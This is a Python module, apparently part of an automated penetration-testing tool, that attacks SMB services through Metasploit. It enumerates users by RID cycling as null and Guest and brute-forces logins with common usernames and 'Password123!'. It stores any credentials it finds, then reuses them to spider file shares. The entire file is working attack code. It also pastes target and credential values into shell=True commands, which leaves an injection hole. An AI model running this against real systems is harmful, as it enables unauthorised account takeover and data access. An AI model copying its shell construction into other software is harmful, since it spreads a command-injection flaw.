import subprocess
import re
from mods.mod_utils import *
import os

smb_users = ["admin","user","manager","supervisor","administrator","test","operator","backup","lab","demo","smb"]
original_users_len = len(smb_users)
smb_passwords = ["Password123!"]
domain = '.'
credentials = []


def export_wordlists(_smb_users, _smb_paswords):
    with open('smb_users.txt', 'w') as file:
        file.write('\n'.join(_smb_users))
        file.close()
    
    with open('smb_pass.txt', 'w') as file:
        file.write('\n'.join(_smb_paswords))
        file.close()


def export_credentials():
    with open('smb_credentials.txt', 'w') as file:
        file.write('\n'.join(credentials))
        file.close()
        printc('[+] Credentials stored in smb_credentials.txt', GREEN)


def rid_cycling(target, user="Guest", passw="", domain="."):
    cmd = f'msfconsole -q -x "use scanner/smb/smb_lookupsid;set RHOSTS {target};set SMBUser {user};set SMBPass {passw};set MinRID 500;set MaxRID 5000;set THREADS 10;set SMBDomain {domain};run;exit;"'

    try:
        output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, universal_newlines=True)
    except Exception as e:
        printc(f'[-] {e}', RED)
        return
    if output:
        if ('USER' in output):
            rid_cycling_parse(output, cmd, user, passw)

            log(output, cmd, target, 'msfconsole')


def rid_cycling_parse(output, cmd, user='', passw=''):
    global domain
    global smb_users

    print_banner('445')
    print('[!]', cmd)
    printc('[+] RID Cycling Attack to get Usernames', GREEN)
    print(f'[!] Using these creds: {user} / {passw}')
    print('')

    temp_users = []

    for line in output.splitlines():
        if ('DOMAIN' in line) and ('LOCAL' in line) and (domain == '.'):
            domain = re.findall(r'LOCAL.*DOMAIN\((.*) -', line)[0]
            printc(f'[+] Domain: {domain}', BLUE)
        if ('USER' in line):
            user = re.findall(r'USER=(.*)\sRID', line)[0]
            printc(f'[+] {user}', BLUE)
            temp_users.append(user)
    if len(temp_users) > 0:
        smb_users += temp_users
        smb_users = list(set(smb_users))
        export_wordlists(smb_users, smb_passwords)


def bruteforce(target, port):
    global credentials
    cmd = f'msfconsole -q -x "use scanner/smb/smb_login;set rhosts {target};set RPORT {port};set SMBDomain {domain};set USER_AS_PASS true;set BLANK_PASSWORDS false;set PASS_FILE $(pwd)/smb_pass.txt; set USER_FILE $(pwd)/smb_users.txt;set VERBOSE false;run;exit;"'

    try:
        output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, universal_newlines=True)
    except Exception as e:
        printc(f'[-] {e}', RED)
        return

    if output:
        if ('[+]' in output):
            print_banner('445')
            print('[!]', cmd)
            printc('[+] Creds Found!!!', GREEN)
            print('')
            for line in output.splitlines():
                creds = re.findall(r"Success:\s\'(.*)\'", line)
                if creds:
                    creds = creds[0].split('\\')[1]
                    if (creds.split(':')[1] == ''): continue
                    printc(f'[+] {creds}', BLUE)
                    credentials.append(creds)

            log(output, cmd, target, 'msfconsole')
            
    if credentials:
        export_credentials()


def enumerate_shares(target, user='Guest', passw='', domain='.'):
    cmd = f'msfconsole -q -x "use scanner/smb/smb_enumshares;set RHOSTS {target};set SMBPass {passw};set SMBUser {user};set SMBDomain {domain};set LogSpider 0;set MaxDepth 0;set ShowFiles true;set SpiderShares true;run;exit;"'

    try:
        output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, universal_newlines=True)
    except Exception as e:
        printc(f'[-] {e}', RED)
        return

    if output:
        if ('[+]' in output):
            print_banner('445')
            print('[!]', cmd)
            print('[!] Enumerating Shares.')
            print('')
            print(output)

            log(output, cmd, target, 'msfconsole')


def handle_smb(target, port):
    if not os.path.exists('smb_credentials.txt'):
        # RID CYCLING AS NULL
        rid_cycling(target, user='')
        # RID CYCLING AS GUEST
        rid_cycling(target)
        # If no usernames where founded, bruteforce with common users and pass
        export_wordlists(smb_users, smb_passwords)
        # BRUTEFORCE LOGIN
        bruteforce(target, port)

        # ENUMERATE SHARES
        # SHARES AS GUEST
        enumerate_shares(target)
        # SHARES AS NULL
        enumerate_shares(target, user='')

    if os.path.exists('smb_credentials.txt'):
        global credentials
        with open('smb_credentials.txt', 'r') as file:
            credentials = file.readlines()
        cred = ''
        if (len(credentials)>0):
            for cred in credentials:
                if ('Guest' not in cred) and (':' in cred):
                    user, passw = cred.split(':')[:2]
                    # RID CYCLING WITH CREDS
                    rid_cycling(target, user, passw, domain)
                    # SHARES WITH CREDS
                    enumerate_shares(target, user, passw, domain)

    try:
        os.remove('smb_users.txt')
        os.remove('smb_pass.txt')
        if not credentials:
            os.remove('smb_credentials.txt')
    except Exception as e:
        pass
        #printc(f'[-] {e}', RED)